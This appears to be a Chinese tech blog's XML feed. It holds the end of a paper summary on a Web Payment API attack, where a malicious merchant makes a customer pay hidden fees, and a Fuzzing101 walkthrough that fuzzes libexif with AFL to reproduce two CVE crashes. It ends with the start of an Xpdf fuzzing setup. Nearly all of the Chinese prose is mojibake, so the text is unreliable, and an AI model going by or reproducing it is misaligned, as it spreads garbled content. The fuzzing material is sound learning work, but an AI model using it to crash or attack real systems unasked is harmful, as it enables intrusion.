¹æ®W3Cè§„èŒƒï¼Œè¿™æ˜¯å®Œå…¨æœ‰æ•ˆçš„ã€‚å…¶ä¸­ä¸€ä¸ªæ¡ç›®å¯èƒ½ä¸åŒ…å«ä»»ä½•è´¹ç”¨ï¼Œè€Œå¦ä¸€ä¸ªå¯èƒ½åŒ…å«éå¸¸é«˜çš„è´¹ç”¨ã€‚</li><li>æäº¤æ”¯ä»˜è¯·æ±‚ï¼šå•†å®¶å°†æ”¯ä»˜è¯·æ±‚PRæäº¤ç»™WPAï¼ˆå¦‚å¾€å¸¸ä¸€æ ·ï¼‰ã€‚è¿™è§¦å‘æµè§ˆå™¨åœ¨å…¶å®‰è£…çš„æ”¯ä»˜å¤„ç†å™¨åˆ—è¡¨ä¸­æœç´¢ä¸PRä¸­ç»™å®šçš„æ”¯ä»˜æ–¹å¼æ ‡è¯†ç¬¦åŒ¹é…çš„å¤„ç†å™¨ï¼Œå¹¶æŸ¥è¯¢åŒ¹é…çš„å¤„ç†å™¨ã€‚</li><li>æ˜¾ç¤ºæ”¯ä»˜ç•Œé¢ï¼šä¹‹åï¼Œæµè§ˆå™¨æ˜¾ç¤ºæ”¯ä»˜ç•Œé¢ã€‚æˆ‘ä»¬å‡è®¾ç”¨æˆ·æ€»æ˜¯é€‰æ‹©ç¬¬ä¸€ä¸ªæ¡ç›®ï¼Œå³ä¸åŒ…å«é¢å¤–è´¹ç”¨çš„æ¡ç›®ã€‚å¥¹è¾“å…¥æ‰€éœ€æ•°æ®å¹¶æäº¤ã€‚</li><li>è°ƒç”¨æ”¯ä»˜å¤„ç†å™¨ï¼šç°åœ¨ï¼Œæµè§ˆå™¨å°†å¸¦æœ‰æ”¯ä»˜ç»†èŠ‚çš„PaymentRequestEventï¼ˆåŒ…æ‹¬å®Œæ•´çš„methodDataåˆ—è¡¨ï¼Œå³ä¸¤ä¸ªæ¡ç›®ï¼‰äº¤ç»™æ‰€é€‰çš„æ”¯ä»˜å¤„ç†å™¨ã€‚</li><li>æ”¯ä»˜å¤„ç†å™¨å†³ç­–ï¼šç„¶è€Œï¼ŒPaymentRequestEventä¸åŒ…å«ç”¨æˆ·ä»methodDataä¸­é€‰æ‹©äº†å“ªä¸ªæ¡ç›®çš„ä¿¡æ¯ã€‚æ”¯ä»˜å¤„ç†å™¨ç°åœ¨å¿…é¡»å†³å®šä½¿ç”¨å“ªä¸ªæ”¯ä»˜æ–¹å¼æ•°æ®æ¡ç›®ã€‚ç”±äºè§„èŒƒä¸­ä¹Ÿæ²¡æœ‰å…³äºæ­¤çš„æŒ‡å¯¼ï¼Œæˆ‘ä»¬å‡è®¾æ”¯ä»˜å¤„ç†å™¨æ€»æ˜¯é€‰æ‹©æœ€åä¸€ä¸ªæ”¯ä»˜æ–¹å¼æ•°æ®æ¡ç›®ï¼ˆåœ¨æˆ‘ä»¬çš„æ”»å‡»ä¸­ä¼šäº§ç”Ÿå·¨é¢çš„é¢å¤–è´¹ç”¨ï¼‰å¹¶æ‰§è¡Œæ”¯ä»˜ã€‚</li><li>å®Œæˆæ”¯ä»˜ï¼šå…¶ä½™æ­¥éª¤ä¸å¸¸è§„æ”¯ä»˜æµç¨‹ç›¸åŒã€‚ç»“æœæ˜¯ï¼Œé¡¾å®¢è¢«æ”¶å–äº†å¥¹ä»æœªåŒæ„çš„è´¹ç”¨ï¼Œè€Œæ²¡æœ‰ä»»ä½•æç¤ºã€‚</li></ol><p>è¿™ç§æ”»å‡»å¹¶ä¸ä¾èµ–äºæµè§ˆå™¨å’Œæ”¯ä»˜å¤„ç†å™¨åœ¨å­˜åœ¨å¤šä¸ªé€‚ç”¨çš„methodDataæ¡ç›®æ—¶å¦‚ä½•ç¡®å®šé€‰æ‹©å“ªä¸€ä¸ªï¼Œåªè¦å­˜åœ¨è¿™æ ·çš„å¯èƒ½æ€§ï¼Œå®ƒä»¬é€‰æ‹©ä¸åŒçš„æ¡ç›®å³å¯ã€‚è¿™ä½¿å¾—é¡¾å®¢è¢«æ”¶å–æœªçŸ¥è´¹ç”¨çš„æ”»å‡»æˆä¸ºå¯èƒ½ã€‚</p><p>ä¿®å¤æªæ–½ï¼š</p><p>æµè§ˆå™¨å¯ä»¥æ‹’ç»æ¨¡æ£±ä¸¤å¯çš„æ¡ç›®ï¼Œæˆ–è€…å°†ç”¨æˆ·çš„é€‰æ‹©ä¼ é€’ç»™æ”¯ä»˜å¤„ç†ç¨‹åºã€‚æˆ‘ä»¬å»ºè®®é‡‡ç”¨ç¬¬ä¸€ç§é€‰é¡¹ï¼Œä»¥ä¿æŒAPIæ¥å£çš„ç¨³å®šæ€§ã€‚å› ä¸ºæ¯æ¬¡ç”¨æˆ·é€‰æ‹©çš„å˜åŒ–éƒ½å¯èƒ½éœ€è¦æ›´æ–°æ”¯ä»˜å¤„ç†ç¨‹åºçš„å®ç°ï¼Œå¯¼è‡´æ¥å£çš„ä¸ç¨³å®šæ€§å’Œä¸ä¸€è‡´æ€§ã€‚</p><h4 id="æ‹“å±•"><a href="#æ‹“å±•" class="headerlink" title="æ‹“å±•"></a>æ‹“å±•</h4><p>ä¸ºäº†å…¨é¢åˆ†æWPAï¼Œå¯¹WIMåšå‡ºäº†ä»¥ä¸‹æ‹“å±•</p><ol><li>å¯æ‰©å±•çš„DOMäº‹ä»¶å¤„ç†ï¼šWPAå¤§é‡ä½¿ç”¨DOMäº‹ä»¶æ¥è§¦å‘æ”¯ä»˜å¤„ç†ç¨‹åºã€‚ä¸ºäº†æ¨¡æ‹Ÿè¿™äº›äº‹ä»¶çš„å¤„ç†è¿‡ç¨‹ï¼ŒWIMï¼ˆWeb Infrastructure Modelï¼‰çš„æµè§ˆå™¨æ¨¡å‹è¢«æ‰©å±•ï¼Œå¼•å…¥äº†ä¸€ç»„å¾…å¤„ç†äº‹ä»¶å’Œä¸€ä¸ªå¯æ‰©å±•çš„å¤„ç†å‡½æ•°ã€‚å½“æµè§ˆå™¨è¢«è§¦å‘å¤„ç†DOMäº‹ä»¶æ—¶ï¼Œå…¶ä¸­ä¸€ä¸ªå¾…å¤„ç†äº‹ä»¶ä¼šè¢«éšæœºé€‰æ‹©ï¼Œä»å¾…å¤„ç†äº‹ä»¶é›†åˆä¸­ç§»é™¤ï¼Œå¹¶äº¤ç»™å¤„ç†å‡½æ•°å¤„ç†ã€‚è¿™æ ·ï¼Œæ¨¡æ‹Ÿäº†äº‹ä»¶çš„ä¼ é€’å’Œå¤„ç†è¿‡ç¨‹ã€‚</li><li>Service Workersï¼šService Workersæ˜¯åœ¨æµè§ˆå™¨ä¸­åå°è¿è¡Œçš„äº‹ä»¶é©±åŠ¨å‹JavaScriptç¨‹åºï¼Œå¯ç”¨äºä¸ºWebåº”ç”¨ç¨‹åºæä¾›ç¦»çº¿åŠŸèƒ½ã€‚åœ¨WPAä¸­ï¼Œæ”¯ä»˜å¤„ç†ç¨‹åºè¢«è§†ä¸ºService Workersçš„å®ä¾‹ã€‚å› æ­¤ï¼ŒWIMçš„æµè§ˆå™¨æ¨¡å‹è¢«æ‰©å±•ï¼ŒåŠ å…¥äº†ä¸€ç»„æ³¨å†Œçš„Service Workersã€‚ç±»ä¼¼äºäº‹ä»¶å¤„ç†ï¼Œå½“æµè§ˆå™¨è¢«è§¦å‘æ—¶ï¼ŒService Workerå¯ä»¥è¢«éç¡®å®šæ€§åœ°é€‰æ‹©æ‰§è¡Œï¼Œä»è€Œæ¨¡æ‹Ÿäº†Service Workerçš„è¿è¡Œè¿‡ç¨‹ã€‚</li><li>è„šæœ¬APIæ‰©å±•ï¼šWPAæœ¬èº«æ˜¯WIMæµè§ˆå™¨æ¨¡å‹çš„é‡è¦æ‰©å±•ã€‚WPAå·²è¢«å„å¤§ä¸»æµæµè§ˆå™¨å®ç°ï¼Œè¿™å¯¼è‡´äº†åœ¨çœŸå®æ‰§è¡Œç¯å¢ƒä¸­ï¼Œç½‘é¡µåº”ç”¨ç¨‹åºå’Œè„šæœ¬ï¼ˆè¯šå®æˆ–ä¸è¯šå®ï¼‰å¯èƒ½ä¼šå¹²æ‰°WPAçš„å„ä¸ªéƒ¨åˆ†ï¼Œä»è€Œæ‰©å¤§äº†æ”»å‡»é¢ã€‚ä¸ºæ­¤ï¼ŒWIMçš„è„šæœ¬APIè¢«æ‰©å±•ï¼Œå°†WPAè§„èŒƒä¸­å®šä¹‰çš„APIå‡½æ•°å½¢å¼åŒ–ä¸ºè„šæœ¬å‘½ä»¤ï¼Œå³è„šæœ¬å¯ä»¥è¾“å‡ºå‘½ä»¤ï¼ŒæŒ‡ç¤ºæµè§ˆå™¨è°ƒç”¨å…·æœ‰ç»™å®šå‚æ•°åˆ—è¡¨çš„APIå‡½æ•°ã€‚è¿™äº›APIå‡½æ•°çš„å®šä¹‰éµå¾ªWPAè§„èŒƒï¼Œå¹¶å…è®¸å¯¹å…¶è¿›è¡Œå½¢å¼åŒ–çš„åˆ†æã€‚</li></ol><h3 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h3><p><strong>ä¸ºä»€ä¹ˆæ­¤å¤„å¯¹äºWPAæ¨¡å‹å®‰å…¨æ€§çš„åˆ†æéƒ½æ˜¯å‡è®¾å•†å®¶æ˜¯æ¶æ„çš„è€Œç”¨æˆ·æ˜¯è¯šå®çš„</strong></p><p>ä¸ªäººç†è§£ï¼šé¦–å…ˆï¼Œç”¨æˆ·çš„è¡Œä¸ºé€šå¸¸æ˜¯ä¼šå—åˆ°è¾ƒå¤§çº¦æŸçš„ï¼Œå‘èµ·ä¸»åŠ¨æ”»å‡»çš„éš¾åº¦è¾ƒå¤§ã€‚å¤šæ•°æ”»å‡»æ˜¯é’ˆå¯¹æ­£å¸¸è¿ä½œçš„ç³»ç»Ÿå‘èµ·çš„ã€‚è™½ç„¶ç”¨æˆ·çš„ä¸€äº›æ”»å‡»è¡Œä¸ºå¯èƒ½ä¼šè·å–ä¸å½“åˆ©ç›Šï¼Œä¾‹å¦‚è¿›è¡Œè™šå‡æ”¯ä»˜ã€‚ä½†æ˜¯ä»å®‰å…¨ç ”ç©¶çš„è§’åº¦æ¥çœ‹ï¼Œé€šå¸¸æ›´å…³æ³¨çš„æ˜¯é‚£äº›é’ˆå¯¹ç³»ç»Ÿæœ¬èº«çš„æ¼æ´å’Œæ”»å‡»ã€‚å…¶æ¬¡ï¼Œå½“è¿›è¡Œç³»ç»Ÿå®‰å…¨æ€§è¯„ä¼°å’Œæ¼æ´åˆ†ææ—¶ï¼Œå‡è®¾å•†å®¶æ˜¯æ¶æ„çš„å¯ä»¥å¸®åŠ©ç ”ç©¶äººå‘˜æ›´å¥½åœ°ç†è§£ç³»ç»Ÿçš„è„†å¼±ç‚¹å’Œæ½œåœ¨é£é™©ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Exercise2</title>
    <link href="/2023/07/19/Exercise2/"/>
    <url>/2023/07/19/Exercise2/</url>
    
    <content type="html"><![CDATA[<h2 id="Exercise2-libexif"><a href="#Exercise2-libexif" class="headerlink" title="Exercise2 libexif"></a>Exercise2 libexif</h2><h3 id="ä»»åŠ¡ç›®æ ‡ï¼š"><a href="#ä»»åŠ¡ç›®æ ‡ï¼š" class="headerlink" title="ä»»åŠ¡ç›®æ ‡ï¼š"></a>ä»»åŠ¡ç›®æ ‡ï¼š</h3><p>å¯¹libexif EXIFè§£æåº“è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œç›®æ ‡æ˜¯åœ¨ libexif 0.6.14 ä¸­æ‰¾åˆ° <a href="https://nvd.nist.gov/vuln/detail/CVE-2009-3895">CVE-2009-3895</a> ï¼ˆä¸€ç§åŸºäºå †çš„ç¼“å†²åŒºæº¢å‡ºï¼‰çš„å´©æºƒ&#x2F;PoC å’Œ <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2836">CVE-2012-2836</a> ï¼ˆè¶Šç•Œè¯»å–æ¼æ´ï¼‰çš„å¦ä¸€ä¸ªå´©æºƒã€‚</p><h3 id="å®éªŒæµç¨‹"><a href="#å®éªŒæµç¨‹" class="headerlink" title="å®éªŒæµç¨‹"></a>å®éªŒæµç¨‹</h3><p><strong>ä¸‹è½½å¹¶è§£å‹libexif</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/libexif/</span>libexif<span class="hljs-regexp">/archive/</span>refs<span class="hljs-regexp">/tags/</span>libexif-<span class="hljs-number">0</span>_6_14-release.tar.gz<br>tar -xzvf libexif-<span class="hljs-number">0</span>_6_14-release.tar.gz<br></code></pre></td></tr></table></figure><p>libexifæ˜¯ä¸€ä¸ªå¼€æºçš„ç”¨äºå¤„ç†Exchangeable Image File Format (EXIF) æ•°æ®çš„Cè¯­è¨€åº“ï¼Œæä¾›äº†ä¸€ç»„åŠŸèƒ½å¼ºå¤§çš„APIï¼Œç”¨äºè¯»å–ã€å†™å…¥å’Œæ“ä½œEXIFæ•°æ®ã€‚</p><p><strong>å®‰è£…libexif</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd libexif-libexif-0_6_14-release/<br>sudo apt-<span class="hljs-built_in">get</span> install autopoint libtool gettext libpopt-dev<br>autoreconf -fvi<br>./configure <span class="hljs-attribute">--enable-shared</span>=<span class="hljs-literal">no</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p><code>autoreconf</code> æ˜¯ä¸€ä¸ªç”¨äºè‡ªåŠ¨é‡å»º Autotools æ„å»ºç³»ç»Ÿçš„å·¥å…·ï¼Œè¯¥å‘½ä»¤é€šå¸¸ç”¨äºåœ¨æºä»£ç ç›®å½•ä¸­è¿è¡Œ Autotools å·¥å…·é“¾ï¼Œä»¥é‡æ–°ç”Ÿæˆé…ç½®è„šæœ¬ <code>configure</code>ã€æ„å»ºè§„åˆ™ <code>Makefile.in</code> å’Œå…¶ä»–ç›¸å…³æ–‡ä»¶ã€‚è¿™æ ·å¯ä»¥ç¡®ä¿é…ç½®å’Œæ„å»ºç³»ç»Ÿä¸å½“å‰ç¯å¢ƒå’Œä¾èµ–é¡¹ä¿æŒåŒæ­¥ã€‚</p><p><strong>å®‰è£…EXIF</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/fuzzing_libexif<br>wget https://github.com/libexif/exif/archive/refs/tags/exif-0_6_15-release.tar.gz<br>tar -xzvf exif-0_6_15-release.tar.gz<br><br><span class="hljs-built_in">cd</span> exif-exif-0_6_15-release/<br>autoreconf -fvi<br>./configure --enable-shared=no --prefix=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span> PKG_CONFIG_PATH=<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/lib/pkgconfig<br>make<br>make install<br></code></pre></td></tr></table></figure><p>ç”±äºlibexifæ˜¯ä¸€ä¸ªåº“ï¼Œæ˜¯ä¸€ç»„åŠŸèƒ½çš„é›†åˆè€Œæœ¬èº«ä¸æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„æ‰§è¡Œæ–‡ä»¶ï¼Œå› æ­¤éœ€è¦å®‰è£…ä½¿ç”¨è¿™ä¸ªåº“çš„ä¸€ä¸ªåº”ç”¨ç¨‹åºæ¥è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚ä½¿ç”¨åº“çš„ç¨‹åºé€šå¸¸ä¼šéªŒè¯è¾“å…¥æ•°æ®çš„æœ‰æ•ˆæ€§å’Œåˆæ³•æ€§ã€‚æ¨¡ç³Šæµ‹è¯•å·¥å…·å¯èƒ½ç”Ÿæˆå…·æœ‰ä¸åŒæ ¼å¼çš„è¾“å…¥ï¼ŒåŒ…æ‹¬ä¸åˆæ³•çš„è¾“å…¥ã€‚ä½¿ç”¨è¯¥åº“çš„ç¨‹åºå¯ä»¥éªŒè¯å¹¶è§£æè¿™äº›è¾“å…¥ã€‚</p><p><strong>éªŒè¯å®‰è£…</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_libexif/i</span>nstall<span class="hljs-regexp">/bin/</span>exif<br></code></pre></td></tr></table></figure><p><strong>è·å–æ ·æœ¬</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-variable">$HOME</span>/fuzzing_libexif<br>wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ianare/</span>exif-samples<span class="hljs-regexp">/archive/</span>refs<span class="hljs-regexp">/heads/m</span>aster.zip<br>unzip master.zip<br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨alf-clang-ltoç¼–è¯‘libexifå’Œexif</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">rm -r <span class="hljs-variable">$HOME</span>/fuzzing_libexif/install<br>cd <span class="hljs-variable">$HOME</span>/fuzzing_libexif/libexif-libexif-0_6_14-release/<br>make clean<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-attribute">CC</span>=afl-clang-lto ./configure <span class="hljs-attribute">--enable-shared</span>=<span class="hljs-literal">no</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd <span class="hljs-variable">$HOME</span>/fuzzing_libexif/exif-exif-0_6_15-release<br>make clean<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-attribute">CC</span>=afl-clang-lto ./configure <span class="hljs-attribute">--enable-shared</span>=<span class="hljs-literal">no</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span> <span class="hljs-attribute">PKG_CONFIG_PATH</span>=<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/lib/pkgconfig<br>make<br>make install<br></code></pre></td></tr></table></figure><p>afl-clang-lto æ˜¯ AFLçš„ä¸€ä¸ªå®šåˆ¶ç‰ˆæœ¬ï¼Œå®ƒä½¿ç”¨äº† Link Time Optimizationï¼ˆLTOï¼‰æŠ€æœ¯ã€‚LTO å¯ä»¥åœ¨é“¾æ¥æ—¶ä¼˜åŒ–ä»£ç ï¼ŒåŒ…æ‹¬åœ¨ä¸åŒç¼–è¯‘å•å…ƒä¹‹é—´è¿›è¡Œå…¨å±€çš„ä»£ç ä¼˜åŒ–ã€‚é€šè¿‡ä½¿ç”¨ afl-clang-lto ç¼–è¯‘ï¼Œå¯ä»¥æé«˜æ¨¡ç³Šæµ‹è¯•çš„ä»£ç è¦†ç›–ç‡ï¼Œå› ä¸ºä¼˜åŒ–çš„ä»£ç æ›´æœ‰å¯èƒ½æ¢ç´¢åˆ°æ›´å¤šè·¯å¾„å’Œåˆ†æ”¯ã€‚åŒæ—¶ç›¸æ¯”äºafl-clangï¼Œafl-clang-ltoå…·æœ‰æ›´å¥½çš„æ€§èƒ½ã€‚</p><p><strong>è¿›è¡Œæ¨¡ç³Šæµ‹è¯•</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">afl-fuzz -i <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_libexif/</span>exif-samples-master<span class="hljs-regexp">/jpg/</span> -o <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_libexif/</span>out<span class="hljs-regexp">/ -s 123 -- $HOME/</span>fuzzing_libexif<span class="hljs-regexp">/install/</span>bin/exif @@<br></code></pre></td></tr></table></figure><p>å¾—åˆ°å¦‚ä¸‹è¾“å‡º</p><p><img src="/2023/07/19/Exercise2/image-20230721171848925.png" alt="image-20230721171848925"></p><h3 id="æ£€æŸ¥"><a href="#æ£€æŸ¥" class="headerlink" title="æ£€æŸ¥"></a>æ£€æŸ¥</h3><p>ç¼–è¯‘å‡ºå¸¦è°ƒè¯•ä¿¡æ¯çš„å¯æ‰§è¡Œæ–‡ä»¶</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd libexif-libexif-0_6_14-release<br>make clean<br><span class="hljs-attribute">CFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> <span class="hljs-attribute">CXXFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> ./configure <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br> <br>cd exif-exif-0_6_15-release<br>make clean<br><span class="hljs-attribute">CFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> <span class="hljs-attribute">CXXFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> <span class="hljs-attribute">PKG_CONFIG_PATH</span>=<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/lib/pkgconfig ./configure <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p>é€šè¿‡GDBè·‘å‡ºcrash</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gdb --args .<span class="hljs-regexp">/install/</span>bin<span class="hljs-regexp">/exif ./</span>out<span class="hljs-regexp">/default/</span>crashes/&lt;your filename&gt;<br></code></pre></td></tr></table></figure><p><strong>crash1</strong></p><p><img src="/2023/07/19/Exercise2/image-20230722111050543.png" alt="image-20230722111050543"></p><p>ä¸Exercise1ä¸€æ ·ï¼ŒæŠ¥é”™ä¸ºSIGSEGVï¼ŒSegmentation faultï¼Œå­˜åœ¨å†…å­˜æ³„æ¼ï¼Œæ ¹æ®æŠ¥é”™ä¿¡æ¯å¯ä»¥çœ‹å‡ºä¸ºåœ°å€æ— æ³•è®¿é—®</p><p><strong>crash2</strong></p><p><img src="/2023/07/19/Exercise2/image-20230722111516258.png" alt="image-20230722111516258"></p><p>é”™è¯¯ä¿¡æ¯ï¼šå­˜åœ¨å†…å­˜æ³„æ¼</p><p>é”™è¯¯ä½ç½®ï¼š..&#x2F;sysdeps&#x2F;x86_64&#x2F;multiarch&#x2F;memmove-vec-unaligned-erms.S</p><h4 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h4><p>å®˜æ–¹ä¿®å¤æ–¹æ¡ˆï¼š</p><ul><li><a href="https://github.com/libexif/libexif/commit/8ce72b7f81e61ef69b7ad5bdfeff1516c90fa361">https://github.com/libexif/libexif/commit/8ce72b7f81e61ef69b7ad5bdfeff1516c90fa361</a></li><li><a href="https://github.com/libexif/libexif/commit/00986f6fa979fe810b46e376a462c581f9746e06">https://github.com/libexif/libexif/commit/00986f6fa979fe810b46e376a462c581f9746e06</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Fuzzing101</category>
      
    </categories>
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing101-Exercise1</title>
    <link href="/2023/07/09/Exercise1/"/>
    <url>/2023/07/09/Exercise1/</url>
    
    <content type="html"><![CDATA[<h2 id="Fuzzing-101"><a href="#Fuzzing-101" class="headerlink" title="Fuzzing 101"></a>Fuzzing 101</h2><h3 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h3><p>å®éªŒç›®çš„ï¼šå®‰è£…Xpdfï¼Œå®‰è£…AFLå·¥å…·å¹¶äº†è§£å¦‚ä½•ä½¿ç”¨</p><p>åˆ›å»ºç›®å½•å¹¶å®‰è£…åŸºæœ¬å·¥å…·åŒ…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> fuzzing_xpdf &amp;&amp; <span class="hljs-built_in">cd</span> fuzzing_xpdf/<br>sudo apt install build-essential<br></code></pre></td></tr></table></figure><p>ä¸‹è½½ï¼Œè§£å‹Xpdfï¼Œå¹¶å®Œæˆå®‰è£…</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">wget https://<span class="hljs-keyword">dl</span>.xpdfreader.<span class="hljs-keyword">com</span>/old/xpdf-<span class="hljs-number">3.02</span>.tar.gz<br>tar -xvzf xpdf-<span class="hljs-number">3.02</span>.tar.gz<br><span class="hljs-keyword">cd</span> xpdf-<span class="hljs-number">3.02</span><br>sudo apt <span class="hljs-keyword">update</span> &amp;&amp; sudo apt install -<span class="hljs-keyword">y</span> build-essential gcc<br>./configure --prefix=<span class="hljs-string">&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="hljs-keyword">make</span><br><span class="hljs-keyword">make</span> install<br></code></pre></td></tr></table></figure><p>æµ‹è¯•Xpdfï¼Œå¯ä»¥ä¸‹è½½æµ‹è¯•æ ·ä¾‹æˆ–è€…è‡ªå·±é€ ä¸€ä¸ªpdf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/fuzzing_xpdf<br><span class="hljs-built_in">mkdir</span> pdf_examples &amp;&amp; <span class="hljs-built_in">cd</span> pdf_examples<br>wget http://www.africau.edu/images/default/sample.pdf<br></code></pre></td></tr></table></figure><p>é€šè¿‡å‘½ä»¤ <code>$HOME/fuzzing_xpdf/install/bin/pdfinfo -box -meta $HOME/fuzzing_xpdf/pdf_examples/sample.pdf</code>  å¯ä»¥å¾—åˆ°å¦‚ä¸‹è¾“å‡º</p><p><img src="/2023/07/09/Exercise1/image-20230708231306619.png" alt="image-20230708231306619"></p><p><code>$HOME/fuzzing_xpdf/install/bin/pdfinfo</code> æŒ‡å®šçš„è¦æ‰§è¡Œçš„ç¨‹åºè·¯å¾„ï¼Œ<code>-box -meta</code> æ˜¯å‘pdfinfoç¨‹åºä¼ é€’çš„é€‰é¡¹å’Œå‚æ•°ï¼Œ-box è¡¨ç¤ºæ˜¾ç¤ºæ–‡æ¡£çš„é¡µé¢æ¡†çº¿ï¼Œ-metaæ˜¾ç¤ºæ–‡æ¡£çš„å…ƒæ•°æ®ä¿¡æ¯</p><p><code>$HOME/fuzzing_xpdf/pdf_examples/sample.pdf</code> æŒ‡å®šçš„æ˜¯è¦æ“ä½œçš„pdfæ–‡ä»¶</p><p><img src="/2023/07/09/Exercise1/image-20230708231459280.png" alt="image-20230708231459280"></p><p>åœ¨pdfinfoçš„ç›®å½•ä¸‹è¿˜æœ‰å¦‚ä¸‹ç¨‹åºï¼š</p><ul><li>pdffontsï¼šç”¨äºæ˜¾ç¤º PDF æ–‡ä»¶ä¸­ä½¿ç”¨çš„å­—ä½“ä¿¡æ¯ï¼ŒåŒ…æ‹¬å­—ä½“åç§°ã€ç±»å‹ã€åµŒå…¥çŠ¶æ€ç­‰</li><li>pdfimagesï¼šç”¨äºä» PDF æ–‡ä»¶ä¸­æå–å›¾åƒã€‚å®ƒå¯ä»¥å°† PDF æ–‡ä»¶ä¸­çš„å›¾åƒæå–ä¸ºç‹¬ç«‹çš„å›¾åƒæ–‡ä»¶</li><li>pdftopsï¼šç”¨äºå°† PDF æ–‡ä»¶è½¬æ¢ä¸º PostScript æ ¼å¼ã€‚PostScript 